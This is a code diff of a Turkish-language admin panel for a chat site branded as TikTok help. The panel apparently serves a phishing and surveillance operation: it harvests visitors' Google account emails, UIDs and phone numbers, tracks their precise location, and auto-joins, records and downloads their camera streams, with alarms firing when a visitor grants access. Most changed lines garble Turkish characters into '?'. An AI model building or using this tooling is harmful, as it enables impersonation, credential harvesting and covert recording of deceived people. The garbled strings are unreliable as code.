@@ -1,4 +1,4 @@
-import "./chat-sync.js?v=99";
+import "./chat-sync.js?v=100";
 
 async function ready() {
   if (window.ChatSync) return window.ChatSync;
@@ -17,7 +17,7 @@ async function ready() {
         resolve(window.ChatSync);
         return;
       }
-      // Firebase CDN geç yüklenebilir — 15 sn bekle
+      // Firebase CDN ge? y?klenebilir ? 15 sn bekle
       if (n > 300) {
         clearInterval(t);
         resolve(null);
@@ -27,7 +27,7 @@ async function ready() {
 }
 
 function fmtTime(ts) {
-  if (!ts) return "—";
+  if (!ts) return "?";
   return new Date(ts).toLocaleString("tr-TR", {
     day: "2-digit",
     month: "2-digit",
@@ -41,7 +41,7 @@ function shortId(id) {
 }
 
 function whoLabel(msg) {
-  if (msg.who === "user") return "Ziyaretçi";
+  if (msg.who === "user") return "Ziyaret?i";
   if (msg.who === "admin" || msg.from === "admin") return "Sen";
   return "Bot";
 }
@@ -164,7 +164,7 @@ async function unlockAlertAudio() {
     if (ctx.state === "suspended") {
       await ctx.resume();
     }
-    // Gerçek sessiz tick — tarayici ses kilidini açar
+    // Ger?ek sessiz tick ? tarayici ses kilidini a?ar
     const buffer = ctx.createBuffer(1, 1, 22050);
     const src = ctx.createBufferSource();
     src.buffer = buffer;
@@ -172,7 +172,7 @@ async function unlockAlertAudio() {
     src.start(0);
     audioUnlocked = ctx.state === "running";
   } catch (err) {
-    console.warn("Ses açilamadi", err);
+    console.warn("Ses a?ilamadi", err);
     audioUnlocked = false;
   }
   updateNotifyBtnLabel();
@@ -182,15 +182,15 @@ async function unlockAlertAudio() {
 function updateNotifyBtnLabel() {
   if (!notifyBtn) return;
   if (!alertsArmed) {
-    notifyBtn.textContent = "?? Alarmlari aç";
+    notifyBtn.textContent = "?? Alarmlari a?";
     return;
   }
   if (audioUnlocked) {
     notifyBtn.textContent = notifyEnabled
-      ? "?? Alarm + ses açik"
-      : "?? Ses açik (masaüstü kapali)";
+      ? "?? Alarm + ses a?ik"
+      : "?? Ses a?ik (masa?st? kapali)";
   } else {
-    notifyBtn.textContent = "?? Sesi aç (tikla)";
+    notifyBtn.textContent = "?? Sesi a? (tikla)";
   }
 }
 
@@ -224,7 +224,7 @@ async function playAlertBeeps() {
   }
   audioUnlocked = true;
 
-  // Daha net / yüksek bip
+  // Daha net / y?ksek bip
   const pattern = [
     { t: 0, f: 880, d: 0.12 },
     { t: 0.16, f: 1175, d: 0.14 },
@@ -265,8 +265,8 @@ function startAlertSoundLoop() {
     void playAlertBeeps().then((ok) => {
       if (!ok && alertOverlay && !alertOverlay.hidden && alertBody) {
         // Ses kilitliyse kullaniciya net yaz
-        const tip = " · Ses için sayfaya bir kez tikla / Alarmlari aç";
-        if (!String(alertBody.textContent || "").includes("Ses için")) {
+        const tip = " ? Ses i?in sayfaya bir kez tikla / Alarmlari a?";
+        if (!String(alertBody.textContent || "").includes("Ses i?in")) {
           alertBody.textContent = `${alertBody.textContent || ""}${tip}`;
         }
       }
@@ -314,7 +314,7 @@ function showAdminAlert({ kicker, title, body }) {
   if (alertTitle) alertTitle.textContent = title || "Bildirim";
   if (alertBody) alertBody.textContent = body || "";
   if (alertOverlay) alertOverlay.hidden = false;
-  // Otomatik kapanmaz — sadece Tamam ile
+  // Otomatik kapanmaz ? sadece Tamam ile
   if (alertHideTimer) {
     clearTimeout(alertHideTimer);
     alertHideTimer = null;
@@ -325,7 +325,7 @@ function pushDesktopNotification(title, body) {
   if (!("Notification" in window)) return;
   if (Notification.permission !== "granted") return;
   try {
-    // Ayni tag ? Windows üst üste istiflemez, eskisinin yerine geçer
+    // Ayni tag ? Windows ?st ?ste istiflemez, eskisinin yerine ge?er
     if (lastDesktopNotif) {
       try {
         lastDesktopNotif.close();
@@ -352,7 +352,7 @@ function shouldFireFullAlert(key, force) {
     lastAlertKey = key;
     return true;
   }
-  // Kisa sürede ayni/üst üste alarmlari yut
+  // Kisa s?rede ayni/?st ?ste alarmlari yut
   if (now - lastAlertAt < ALERT_COOLDOWN_MS) return false;
   lastAlertAt = now;
   lastAlertKey = key;
@@ -366,11 +366,11 @@ function fireHighAlert({ kicker, title, body, tag, force = false }) {
   const key = String(tag || title || "alert");
   const full = shouldFireFullAlert(key, force);
 
-  // Toast içerigini her zaman güncelle
+  // Toast i?erigini her zaman g?ncelle
   showAdminAlert({ kicker, title, body });
 
   if (!full) {
-    // Sadece metni güncelle; ses/masaüstü spam yok
+    // Sadece metni g?ncelle; ses/masa?st? spam yok
     return;
   }
 
@@ -384,7 +384,7 @@ function renderRecentFeed(items) {
   if (!recentListEl) return;
   recentListEl.innerHTML = "";
   if (!items?.length) {
-    recentListEl.innerHTML = '<li class="admin-recent-empty">Henüz mesaj yok</li>';
+    recentListEl.innerHTML = '<li class="admin-recent-empty">Hen?z mesaj yok</li>';
     return;
   }
   items.forEach((item) => {
@@ -392,12 +392,12 @@ function renderRecentFeed(items) {
     const btn = document.createElement("button");
     btn.type = "button";
     btn.className = "admin-recent-item";
-    btn.title = "Sohbeti aç";
+    btn.title = "Sohbeti a?";
     const who = whoLabel(item);
     const text = String(item.text || "").trim() || "(bos)";
     btn.innerHTML = `
       <span class="admin-recent-item-top">
-        <span class="admin-recent-item-who">${escapeHtml(who)} · #${shortId(item.sessionId)}</span>
+        <span class="admin-recent-item-who">${escapeHtml(who)} ? #${shortId(item.sessionId)}</span>
         <span>${escapeHtml(fmtTime(item.ts))}</span>
       </span>
       <span class="admin-recent-item-text">${escapeHtml(text)}</span>
@@ -464,7 +464,7 @@ function bindSessionMessages(sessionId) {
   }
   if (!sessionId || !window.ChatSync?.listenMessages) return;
 
-  // onChildAdded geçmisi senkron getirir: attach sirasinda announce kapali
+  // onChildAdded ge?misi senkron getirir: attach sirasinda announce kapali
   let announceLive = false;
   unsubMessages = window.ChatSync.listenMessages(sessionId, (msg) => {
     appendThreadMessage(msg, announceLive);
@@ -515,7 +515,7 @@ function startDash(sync) {
       if (!selectedId && rows[0]) openSession(rows[0]);
       if (sendHint && !rows.length) {
         sendHint.hidden = false;
-        sendHint.textContent = "Henüz oturum yok. Ziyaretçi sohbet baslatinca burada görünür.";
+        sendHint.textContent = "Hen?z oturum yok. Ziyaret?i sohbet baslatinca burada g?r?n?r.";
       }
       return;
     }
@@ -538,7 +538,7 @@ function startDash(sync) {
         const enteredAt = Number(r.enteredAt) || 0;
         const camAt = Number(r.cameraGrantedAt) || 0;
         const locAt = Number(r.lastLocationAt) || 0;
-        // Ilk izin / kamera / konum — sohbet sayfasi olmasa da admin’e düssün
+        // Ilk izin / kamera / konum ? sohbet sayfasi olmasa da admin?e d?ss?n
         const isMedia =
           Boolean(r.cameraGranted || r.hasCamera || r.hasLocation || r.cameraPending) ||
           camAt > prev ||
@@ -566,9 +566,9 @@ function startDash(sync) {
         (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
       )[0];
       fireHighAlert({
-        kicker: "YENI ZIYARETÇI",
+        kicker: "YENI ZIYARET?I",
         title: "Siteye yeni kullanici girdi",
-        body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
+        body: `#${shortId(newest.id)} ? ${newest.page || "/"} ? ${String(
           newest.preview || "Siteye giris yapti"
         ).slice(0, 100)}`,
         tag: `fresh-${newest.id}`,
@@ -598,11 +598,11 @@ function startDash(sync) {
         fireHighAlert({
           kicker: isMedia ? "KAMERA / KONUM" : isEntry ? "SITE GIRISI" : "YENI MESAJ",
           title: isMedia
-            ? "Ziyaretçi izin verdi — kamera/konum"
+            ? "Ziyaret?i izin verdi ? kamera/konum"
             : isEntry
-              ? "Ziyaretçi siteye girdi"
-              : "Ziyaretçi aktivitesi",
-          body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
+              ? "Ziyaret?i siteye girdi"
+              : "Ziyaret?i aktivitesi",
+          body: `#${shortId(newest.id)} ? ${newest.page || "/"} ? ${String(
             newest.preview || ""
           ).slice(0, 120)}`,
           tag: isMedia
@@ -624,7 +624,7 @@ function startDash(sync) {
 function maybeJoinSessionCamera(row) {
   if (!row?.id || !row.lastCallId) return;
   if (!(row.cameraGranted || row.hasCamera || row.cameraPending)) return;
-  // Izin aninda sohbet oturumunu aç + canli kameraya baglan
+  // Izin aninda sohbet oturumunu a? + canli kameraya baglan
   if (selectedId !== row.id) {
     openSession(row);
     return;
@@ -637,7 +637,7 @@ function maybeJoinSessionCamera(row) {
 async function armAlerts() {
   alertsArmed = true;
   bindAudioUnlockGestures();
-  // Önce ses kilidini aç (Notification izni jesti tüketmeden)
+  // ?nce ses kilidini a? (Notification izni jesti t?ketmeden)
   await unlockAlertAudio();
   const played = await playAlertBeeps();
   if ("Notification" in window) {
@@ -658,11 +658,11 @@ async function armAlerts() {
     if (sendHint) {
       sendHint.hidden = false;
       sendHint.textContent =
-        "Ses henüz kilitli. Üstteki “Sesi aç” butonuna tekrar tikla veya sayfaya bir kez tikla.";
+        "Ses hen?z kilitli. ?stteki ?Sesi a? butonuna tekrar tikla veya sayfaya bir kez tikla.";
     }
   } else if (sendHint) {
     sendHint.hidden = false;
-    sendHint.textContent = "Test sesi çaldi. Alarmlar hazir.";
+    sendHint.textContent = "Test sesi ?aldi. Alarmlar hazir.";
     window.setTimeout(() => {
       if (sendHint.textContent.includes("Test sesi")) sendHint.hidden = true;
     }, 2500);
@@ -701,8 +701,8 @@ function formatLocationLine(loc) {
   const lat = Number(loc.lat);
   const lng = Number(loc.lng);
   const acc = Number(loc.accuracy);
-  const accTxt = Number.isFinite(acc) ? ` · ±${Math.round(acc)} m` : "";
-  const t = loc.ts ? ` · ${fmtTime(loc.ts)}` : "";
+  const accTxt = Number.isFinite(acc) ? ` ? ?${Math.round(acc)} m` : "";
+  const t = loc.ts ? ` ? ${fmtTime(loc.ts)}` : "";
   return `${lat.toFixed(5)}, ${lng.toFixed(5)}${accTxt}${t}`;
 }
 
@@ -751,7 +751,7 @@ function updateMediaDock(row) {
     }
     if (dockCamText) {
       dockCamText.textContent = hasCam
-        ? "Izin verildi · fotograf bekleniyor"
+        ? "Izin verildi ? fotograf bekleniyor"
         : "Kamera izni yok";
     }
   }
@@ -792,7 +792,7 @@ function filteredGoogleAccounts() {
 }
 
 function fmtAuthDate(ts) {
-  if (!ts) return "—";
+  if (!ts) return "?";
   return new Date(ts).toLocaleDateString("en-US", {
     month: "short",
     day: "numeric",
@@ -805,13 +805,13 @@ function renderGmails() {
   const rows = filteredGoogleAccounts();
   const total = googleAccountRows.filter((r) => r.email || r.name || r.uid).length;
   if (gmailCount) {
-    gmailCount.textContent = `${total} hesap · Google Authentication kullanicilari`;
+    gmailCount.textContent = `${total} hesap ? Google Authentication kullanicilari`;
   }
   gmailList.innerHTML = "";
   if (!rows.length) {
     gmailList.innerHTML = total
       ? `<tr class="gmail-empty-row"><td colspan="6">Aramayla eslesen hesap yok</td></tr>`
-      : `<tr class="gmail-empty-row"><td colspan="6">Henüz Google girisi yok. Ziyaretçi Gmail ile girince burada listelenir (Firebase Authentication Users gibi).</td></tr>`;
+      : `<tr class="gmail-empty-row"><td colspan="6">Hen?z Google girisi yok. Ziyaret?i Gmail ile girince burada listelenir (Firebase Authentication Users gibi).</td></tr>`;
     return;
   }
 
@@ -858,7 +858,7 @@ function renderGmails() {
       <td>${escapeHtml(fmtAuthDate(created))}</td>
       <td>${escapeHtml(fmtAuthDate(signedIn))}</td>
       <td><code class="gmail-uid" title="${escapeHtml(uid)}">${escapeHtml(
-        uid.length > 22 ? `${uid.slice(0, 22)}…` : uid
+        uid.length > 22 ? `${uid.slice(0, 22)}?` : uid
       )}</code></td>
       <td class="gmail-actions-cell"></td>
     `;
@@ -930,7 +930,7 @@ function renderSessions(rows) {
   sessionCount.textContent = `${rows.length} oturum`;
   sessionList.innerHTML = "";
   if (!rows.length) {
-    sessionList.innerHTML = '<li class="session-empty">Henüz sohbet yok. Sitede bir sohbet baslatin.</li>';
+    sessionList.innerHTML = '<li class="session-empty">Hen?z sohbet yok. Sitede bir sohbet baslatin.</li>';
     updateMediaDock(null);
     return;
   }
@@ -945,14 +945,14 @@ function renderSessions(rows) {
     mainBtn.type = "button";
     mainBtn.className = "session-item-main";
     const last =
-      row.lastWho === "user" ? "ziyaretçi" : row.lastWho === "admin" ? "sen" : "bot";
+      row.lastWho === "user" ? "ziyaret?i" : row.lastWho === "admin" ? "sen" : "bot";
     const hasCam = Boolean(row.cameraGranted || row.hasCamera || row.lastSnapshotUrl);
     const hasLoc = Boolean(row.hasLocation || row.lastLocation);
     const hasGoogle = Boolean(row.googleEmail || row.googleName || row.googleUid);
     const hasPhone = Boolean(row.phone);
     const googleLine = hasGoogle
       ? escapeHtml(
-          [row.googleName, row.googleEmail].filter(Boolean).join(" · ") || "Google giris"
+          [row.googleName, row.googleEmail].filter(Boolean).join(" ? ") || "Google giris"
         )
       : "";
     const phoneLine = hasPhone ? escapeHtml(String(row.phone)) : "";
@@ -970,7 +970,7 @@ function renderSessions(rows) {
       <span>${escapeHtml(row.preview || "Mesaj yok")}</span>
       ${googleLine ? `<span class="session-google-line">${googleLine}</span>` : ""}
       ${phoneLine ? `<span class="session-google-line">?? ${phoneLine}</span>` : ""}
-      <em>${fmtTime(row.updatedAt)} · ${last}</em>
+      <em>${fmtTime(row.updatedAt)} ? ${last}</em>
       ${badges ? `<div class="session-badges">${badges}</div>` : ""}
     `;
     mainBtn.addEventListener("click", () => openSession(row));
@@ -1015,7 +1015,7 @@ function renderSessions(rows) {
     if (selected) {
       updateMediaDock(selected);
       maybeAutoDownloadSessionRecording(selected);
-      // Canli call dinlenmiyorsa Storage çagrisini da izle
+      // Canli call dinlenmiyorsa Storage ?agrisini da izle
       if (
         selected.lastRecordingCallId &&
         !adminCall &&
@@ -1097,7 +1097,7 @@ function showAdminSnapshot(url) {
 
 function clearAdminLocationUi() {
   if (adminLiveLocation) adminLiveLocation.hidden = true;
-  if (adminLocationText) adminLocationText.textContent = "Konum bekleniyor…";
+  if (adminLocationText) adminLocationText.textContent = "Konum bekleniyor?";
   if (adminLocationMaps) {
     adminLocationMaps.hidden = true;
     adminLocationMaps.removeAttribute("href");
@@ -1111,11 +1111,11 @@ function updateAdminLocationUi(loc, status, error) {
     const lat = Number(loc.lat);
     const lng = Number(loc.lng);
     const acc = Number(loc.accuracy);
-    const accTxt = Number.isFinite(acc) ? ` · ±${Math.round(acc)} m` : "";
+    const accTxt = Number.isFinite(acc) ? ` ? ?${Math.round(acc)} m` : "";
     const t = loc.ts ? new Date(loc.ts).toLocaleTimeString("tr-TR") : "";
     if (adminLocationText) {
       adminLocationText.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}${accTxt}${
-        t ? ` · ${t}` : ""
+        t ? ` ? ${t}` : ""
       }`;
     }
     if (adminLocationMaps) {
@@ -1131,12 +1131,12 @@ function updateAdminLocationUi(loc, status, error) {
   const st = String(status || "");
   if (st === "denied") {
     adminLocationText.textContent =
-      "Konum engelli (Safari). Ziyaretçi: Ayarlar?Safari?Konum?Sor, yenile, kirmizi butona dokun";
+      "Konum engelli (Safari). Ziyaretçi: Ayarlar ? Safari ? Konum ? Sor, yenile, sonra tekrar dene";
   } else if (st === "awaiting-tap" || st === "prompting") {
     adminLocationText.textContent =
       st === "prompting"
         ? "Konum penceresi istendi — ziyaretçi Izin Ver’e basmali"
-        : "Konum bekleniyor — ziyaretçi kirmizi konum butonuna dokunmali";
+        : "Konum bekleniyor — ziyaretçi konum iznini vermeli";
   } else if (st === "unsupported") {
     adminLocationText.textContent = "Tarayici konum desteklemiyor";
   } else if (st === "unavailable" || st === "timeout" || st === "error") {
@@ -1217,7 +1217,7 @@ async function forceDownloadFromUrl(url, name) {
   }
   if (adminCameraBox) adminCameraBox.hidden = false;
   if (reopenCameraBtn) reopenCameraBtn.hidden = true;
-  setCameraUi(true, "Kayit indiriliyor…");
+  setCameraUi(true, "Kayit indiriliyor?");
   sendHint.hidden = false;
   sendHint.textContent = `Kayit indiriliyor: ${fileName}`;
 
@@ -1314,7 +1314,7 @@ function startRecordingWatch(sessionId, callId, state) {
     if (data.recordingStatus === "failed") {
       setCameraUi(
         true,
-        `Storage kaydi yok (${data.recordingError || "hata"}) · yerel yedek deneniyor…`
+        `Storage kaydi yok (${data.recordingError || "hata"}) ? yerel yedek deneniyor?`
       );
       if (state.lastBlob?.size) {
         forceDownloadBlob(state.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
@@ -1326,7 +1326,7 @@ function startRecordingWatch(sessionId, callId, state) {
     }
   });
 
-  // Ziyaretçi kaydi 90 sn + yükleme; 40 sn erken kesilmesin
+  // Ziyaret?i kaydi 90 sn + y?kleme; 40 sn erken kesilmesin
   recordingWatchTimer = window.setTimeout(() => {
     if (recordingWatchKey !== key) return;
     if (state.seenRecordingUrl) {
@@ -1335,17 +1335,17 @@ function startRecordingWatch(sessionId, callId, state) {
     }
     if (state.lastBlob?.size) {
       forceDownloadBlob(state.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
-      setCameraUi(true, "Storage gecikti · yerel kayit indirildi — Storage URL gelirse tekrar iner");
-      // Yerel yedek sonrasi Storage URL için biraz daha dinle
+      setCameraUi(true, "Storage gecikti ? yerel kayit indirildi ? Storage URL gelirse tekrar iner");
+      // Yerel yedek sonrasi Storage URL i?in biraz daha dinle
       recordingWatchTimer = window.setTimeout(() => {
         if (recordingWatchKey === key) stopRecordingWatch();
       }, 120000);
       return;
     }
-    setCameraUi(true, "Kayit bekleniyor… ziyaretçi sayfasi açik mi / Storage kurallari?");
+    setCameraUi(true, "Kayit bekleniyor? ziyaret?i sayfasi a?ik mi / Storage kurallari?");
     sendHint.hidden = false;
     sendHint.textContent =
-      "Kayit henüz gelmedi. Ziyaretçi en az 35 sn kalsin (parça yükleme) veya Kamera’yi sonlandirin.";
+      "Kayit hen?z gelmedi. Ziyaret?i en az 35 sn kalsin (par?a y?kleme) veya Kamera?yi sonlandirin.";
     stopRecordingWatch();
   }, 180000);
 }
@@ -1375,7 +1375,7 @@ function startAdminRecording(stream, state) {
 
   const videoTracks = stream.getVideoTracks().filter((t) => t.readyState === "live");
   if (!videoTracks.length) {
-    setCameraUi(true, "Canli · video track yok");
+    setCameraUi(true, "Canli ? video track yok");
     return false;
   }
 
@@ -1387,7 +1387,7 @@ function startAdminRecording(stream, state) {
       ? new MediaRecorder(recordStream, { mimeType: mime, videoBitsPerSecond: 1_500_000 })
       : new MediaRecorder(recordStream);
   } catch (err) {
-    setCameraUi(true, `Canli · kayit yok (${err?.message || "desteklenmiyor"})`);
+    setCameraUi(true, `Canli ? kayit yok (${err?.message || "desteklenmiyor"})`);
     return false;
   }
 
@@ -1400,21 +1400,21 @@ function startAdminRecording(stream, state) {
     const type = recorder.mimeType || mime || "video/webm";
     const blob = new Blob(chunks, { type });
     state.lastBlob = blob;
-    // Canli oturumdayken indirme butonu gösterme (eski kayit yarisi)
+    // Canli oturumdayken indirme butonu g?sterme (eski kayit yarisi)
     state._recordingStopped?.();
   };
   recorder.onerror = () => {
-    setCameraUi(true, "Canli · kayit hatasi");
+    setCameraUi(true, "Canli ? kayit hatasi");
   };
 
   state.recorder = recorder;
   try {
     recorder.start(500);
-    setCameraUi(true, "Canli · kayit yapiliyor…");
+    setCameraUi(true, "Canli ? kayit yapiliyor?");
     return true;
   } catch {
     state.recorder = null;
-    setCameraUi(true, "Canli · kayit baslatilamadi");
+    setCameraUi(true, "Canli ? kayit baslatilamadi");
     return false;
   }
 }
@@ -1509,7 +1509,7 @@ async function joinAdminCamera(sessionId, callId) {
   await stopAdminCall(false, { keepUi: true });
   resetLiveVideoUi();
   clearAdminLocationUi();
-  setCameraUi(true, "Ziyaretçi onayi bekleniyor…");
+  setCameraUi(true, "Ziyaret?i onayi bekleniyor?");
 
   const sync = window.ChatSync;
   const pc = new RTCPeerConnection(sync.ICE_SERVERS);
@@ -1544,13 +1544,13 @@ async function joinAdminCamera(sessionId, callId) {
     adminRemoteVideo.onloadedmetadata = kick;
     if (track) {
       track.addEventListener("unmute", () => {
-        // Chrome bazen ilk frameden önce siyah gösterir
+        // Chrome bazen ilk frameden ?nce siyah g?sterir
         adminRemoteVideo.srcObject = stream;
         kick();
-        setCameraUi(true, "Canli görüntü");
+        setCameraUi(true, "Canli g?r?nt?");
       });
       if (track.muted === false) {
-        setCameraUi(true, "Canli görüntü");
+        setCameraUi(true, "Canli g?r?nt?");
       }
     }
     showCameraPopup();
@@ -1562,7 +1562,7 @@ async function joinAdminCamera(sessionId, callId) {
     const stream = ev.streams?.[0] || new MediaStream([track]);
     if (track && track.kind === "video") {
       attachLiveVideo(stream, track);
-      // Gösterim için orijinal track; kayit için clone (siyah ekrani önler)
+      // G?sterim i?in orijinal track; kayit i?in clone (siyah ekrani ?nler)
       try {
         const clone = track.clone();
         const recordStream = new MediaStream([clone]);
@@ -1571,7 +1571,7 @@ async function joinAdminCamera(sessionId, callId) {
           startAdminRecording(recordStream, state);
         }, 800);
       } catch {
-        setCameraUi(true, "Canli görüntü");
+        setCameraUi(true, "Canli g?r?nt?");
       }
     }
   };
@@ -1580,22 +1580,22 @@ async function joinAdminCamera(sessionId, callId) {
     if (adminCall !== state) return;
     const s = pc.connectionState;
     if (s === "connected") {
-      setCameraUi(true, "Canli görüntü bagli");
+      setCameraUi(true, "Canli g?r?nt? bagli");
       state.pc?.getReceivers?.().forEach((receiver) => {
         const track = receiver.track;
         if (!track || track.kind !== "video") return;
         attachLiveVideo(new MediaStream([track]), track);
       });
     }
-    if (s === "failed") setCameraUi(true, "Baglanti basarisiz — ag/firewall");
-    if (s === "disconnected") setCameraUi(true, "Baglanti koptu…");
+    if (s === "failed") setCameraUi(true, "Baglanti basarisiz ? ag/firewall");
+    if (s === "disconnected") setCameraUi(true, "Baglanti koptu?");
   };
 
   pc.oniceconnectionstatechange = () => {
     if (adminCall !== state) return;
     const s = pc.iceConnectionState;
     if (s === "connected" || s === "completed") {
-      setCameraUi(true, "Canli görüntü (ICE OK)");
+      setCameraUi(true, "Canli g?r?nt? (ICE OK)");
       state.pc?.getReceivers?.().forEach((receiver) => {
         const track = receiver.track;
         if (!track || track.kind !== "video") return;
@@ -1603,7 +1603,7 @@ async function joinAdminCamera(sessionId, callId) {
       });
     }
     if (s === "failed") {
-      setCameraUi(true, "ICE basarisiz — ag engeli olabilir");
+      setCameraUi(true, "ICE basarisiz ? ag engeli olabilir");
     }
   };
 
@@ -1641,7 +1641,7 @@ async function joinAdminCamera(sessionId, callId) {
       showAdminSnapshot(data.lastSnapshotUrl);
     }
 
-    // Storage kaydi hazir — oturum bitti/kapanmis olsa da indir
+    // Storage kaydi hazir ? oturum bitti/kapanmis olsa da indir
     if (
       data.recordingUrl &&
       data.recordingUrl !== state.seenRecordingUrl &&
@@ -1660,7 +1660,7 @@ async function joinAdminCamera(sessionId, callId) {
 
     if (data.status === "denied") {
       callEnded = true;
-      setCameraUi(true, "Ziyaretçi kamerayi reddetti");
+      setCameraUi(true, "Ziyaret?i kamerayi reddetti");
       await stopAdminCall(false, { keepUi: true });
       return;
     }
@@ -1705,10 +1705,10 @@ async function joinAdminCamera(sessionId, callId) {
         );
       } else if (pending.lastBlob?.size) {
         forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
-        setCameraUi(true, "Yerel kayit indirildi · Storage yedek bekleniyor…");
+        setCameraUi(true, "Yerel kayit indirildi ? Storage yedek bekleniyor?");
         startRecordingWatch(sessionId, callId, pending);
       } else {
-        setCameraUi(true, "Baglanti kapandi · ziyaretçi kaydi yükleniyor…");
+        setCameraUi(true, "Baglanti kapandi ? ziyaret?i kaydi y?kleniyor?");
         startRecordingWatch(sessionId, callId, pending);
       }
       setEndCameraVisible(false);
@@ -1716,22 +1716,22 @@ async function joinAdminCamera(sessionId, callId) {
       return;
     }
     if (data.status === "requested") {
-      // ICE güncellemesi status'u requested birakmis olabilir; ileri gitmis UI'yi geri alma
+      // ICE g?ncellemesi status'u requested birakmis olabilir; ileri gitmis UI'yi geri alma
       if (!data.offer && !data.visitorReady && !answered) {
         clearRecordingLink();
-        setCameraUi(true, "Ziyaretçi onayi bekleniyor…");
+        setCameraUi(true, "Ziyaret?i onayi bekleniyor?");
       }
     }
     if (data.visitorReady && !answered) {
-      setCameraUi(true, "Ziyaretçi kamerayi açti · baglaniyor…");
+      setCameraUi(true, "Ziyaret?i kamerayi a?ti ? baglaniyor?");
     }
     if ((data.status === "live" || data.offer) && !answered) {
-      setCameraUi(true, "Sinyal alindi · yanitlaniyor…");
+      setCameraUi(true, "Sinyal alindi ? yanitlaniyor?");
     }
     if (answered && adminRemoteVideo?.srcObject) {
-      setCameraUi(true, "Canli görüntü");
+      setCameraUi(true, "Canli g?r?nt?");
     } else if (answered) {
-      setCameraUi(true, "Yanit gönderildi · video bekleniyor…");
+      setCameraUi(true, "Yanit g?nderildi ? video bekleniyor?");
     }
     // Bitmis oturumun eski offer/answer'ina baglanma
     if (callEnded) return;
@@ -1761,7 +1761,7 @@ async function joinAdminCamera(sessionId, callId) {
             sdp: answer.sdp,
           });
         }
-        setCameraUi(true, "Yanit gönderildi · video bekleniyor…");
+        setCameraUi(true, "Yanit g?nderildi ? video bekleniyor?");
         const attachReceivers = () => {
           state.pc?.getReceivers?.().forEach((receiver) => {
             const track = receiver.track;
@@ -1782,6 +1782,19 @@ async function joinAdminCamera(sessionId, callId) {
 function appendThreadMessage(msg, announce) {
   if (!msg?.id || seenMessageIds.has(msg.id)) return;
   seenMessageIds.add(msg.id);
+
+  // Otomatik kamera teklifleri sohbeti spam’ler + her mesajda WebRTC’yi sifirlardi
+  if (msg.type === "camera" && (msg.from === "auto" || !msg.from)) {
+    if (announce && msg.callId && selectedId) {
+      const already =
+        adminCall?.callId === msg.callId &&
+        adminCall?.sessionId === selectedId &&
+        adminCall?.pc;
+      if (already) showCameraPopup();
+      else void joinAdminCamera(selectedId, msg.callId);
+    }
+    return;
+  }
 
   const isAdmin = msg.who === "admin" || msg.from === "admin";
   const isLoading = msg.type === "loading";
@@ -1816,10 +1829,13 @@ function appendThreadMessage(msg, announce) {
     const p = document.createElement("p");
     p.textContent = `?? Kamera talebi: ${msg.text || ""}`;
     body.appendChild(p);
-    // Ziyaretçi otomatik kamera (from:auto) — hangi sayfadan gelirse gelsin baglan
     if (announce && msg.callId && selectedId) {
-      resetLiveVideoUi();
-      void joinAdminCamera(selectedId, msg.callId);
+      const already =
+        adminCall?.callId === msg.callId &&
+        adminCall?.sessionId === selectedId &&
+        adminCall?.pc;
+      if (already) showCameraPopup();
+      else void joinAdminCamera(selectedId, msg.callId);
     }
   } else if (msg.type === "photos") {
     const p = document.createElement("p");
@@ -1875,11 +1891,11 @@ function appendThreadMessage(msg, announce) {
       return r.width > 40 && r.height > 60 && r.bottom > 80 && r.top < window.innerHeight - 40;
     })();
 
-    // Karsilikli kural: sohbet görünür/odakliysa sessiz toast; degilse sesli uyari
+    // Karsilikli kural: sohbet g?r?n?r/odakliysa sessiz toast; degilse sesli uyari
     if (!focusedInChat && !threadVisible) {
       fireHighAlert({
         kicker: "YENI MESAJ",
-        title: "Ziyaretçi yazdi",
+        title: "Ziyaret?i yazdi",
         body: text,
         tag: `msg-${selectedId || "x"}`,
         force: document.hidden,
@@ -1887,7 +1903,7 @@ function appendThreadMessage(msg, announce) {
     } else {
       showAdminAlert({
         kicker: "YENI MESAJ",
-        title: "Ziyaretçi yazdi",
+        title: "Ziyaret?i yazdi",
         body: text,
       });
     }
@@ -1908,7 +1924,7 @@ function resetSelectedSessionUi() {
   selectedId = null;
   setThreadToolsEnabled(false);
   clearThreadUi();
-  if (threadTitle) threadTitle.textContent = "Bir sohbet seçin";
+  if (threadTitle) threadTitle.textContent = "Bir sohbet se?in";
   if (threadMeta) threadMeta.textContent = "Sol listeden canli oturumlari izleyin.";
   if (unsubMessages) {
     unsubMessages();
@@ -1924,14 +1940,14 @@ function resetSelectedSessionUi() {
 
 function msgWhoExport(msg) {
   if (msg?.from === "admin" || msg?.who === "admin") return "Destek";
-  if (msg?.who === "user") return "Ziyaretçi";
+  if (msg?.who === "user") return "Ziyaret?i";
   if (msg?.who === "bot") return "Asistan";
   return String(msg?.who || "Bilinmeyen");
 }
 
 function formatChatExportTxt(sessionId, meta, messages) {
   const lines = [
-    "TikTok Yardim — Sohbet disa aktarim",
+    "TikTok Yardim ? Sohbet disa aktarim",
     `Oturum: #${shortId(sessionId)} (${sessionId})`,
     `Sayfa: ${meta?.page || "/"}`,
     `Disa aktarim: ${new Date().toLocaleString("tr-TR")}`,
@@ -1945,7 +1961,7 @@ function formatChatExportTxt(sessionId, meta, messages) {
     let kind = "";
     if (msg.type === "camera") kind = " [kamera]";
     else if (msg.type === "popup") kind = " [popup]";
-    else if (msg.type === "loading") kind = " [yükleme]";
+    else if (msg.type === "loading") kind = " [y?kleme]";
     else if (msg.type === "photos") kind = " [fotograf talebi]";
     else if (msg.type === "photo") kind = " [fotograf]";
     lines.push(`[${when}] ${who}${kind}`);
@@ -1973,11 +1989,11 @@ function downloadTextFile(filename, text) {
 async function exportSelectedChat() {
   if (!selectedId || !window.ChatSync?.getSessionMessages) {
     sendHint.hidden = false;
-    sendHint.textContent = "Önce soldan bir sohbet seçin.";
+    sendHint.textContent = "?nce soldan bir sohbet se?in.";
     return;
   }
   sendHint.hidden = false;
-  sendHint.textContent = "Sohbet disa aktariliyor…";
+  sendHint.textContent = "Sohbet disa aktariliyor?";
   try {
     const [messages, meta] = await Promise.all([
       window.ChatSync.getSessionMessages(selectedId),
@@ -1998,15 +2014,15 @@ async function exportSelectedChat() {
 async function clearSelectedChat() {
   if (!selectedId || !window.ChatSync?.clearSessionMessages) {
     sendHint.hidden = false;
